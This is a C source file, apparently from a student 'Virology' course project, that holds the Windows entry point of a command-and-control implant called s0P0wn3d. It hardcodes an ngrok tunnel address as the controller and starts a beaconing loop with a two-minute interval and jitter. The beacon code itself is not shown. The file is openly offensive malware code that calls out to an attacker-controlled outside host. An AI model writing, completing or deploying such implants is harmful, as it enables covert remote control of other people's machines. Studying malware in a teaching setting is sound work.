/*
 * s0P0wn3d — Point d'entrée de l'implant (Windows).
 *
 * Usage: s0p0wn3d_implant <controller_host> [controller_port] [interval] [jitter]
 */

#include "beacon.h"
#include "../shared/protocol.h"

#include <stdio.h>
#include <stdlib.h>
#include <windows.h>

int main(int argc, char *argv[]) {
    /* Hardcoded ngrok URL - implant will always connect to this controller */
    const char *controller_host = "1018-2a01-cb06-d015-7090-fde7-3e85-575e-ea94.ngrok-free.app";
    int controller_port = 80;  /* HTTP */
    int interval = 120;   /* 2 minutes */
    int jitter = 30;       /* ±30 seconds variation */

    (void)argc;  /* Unused - URL is hardcoded */
    (void)argv;

    printf("╔══════════════════════════════════════════╗\n");
    printf("║   s0P0wn3d Implant v%s                ║\n", S0P_VERSION);
    printf("║   Projet Epitech Virology — Pédagogique   ║\n");
    printf("╚══════════════════════════════════════════╝\n\n");

    printf("[*] Controller: %s:%d\n", controller_host, controller_port);
    printf("[*] Beacon interval: %d seconds\n", interval);
    printf("[*] Jitter: ±%d seconds\n\n", jitter);

    int ret = beacon_loop(controller_host, controller_port, interval, jitter);

    /* Keep window open so we can see errors */
    printf("\n[!] Program ended with code %d\n", ret);
    printf("[!] Press Enter to close...\n");
    getchar();

    return ret;
}
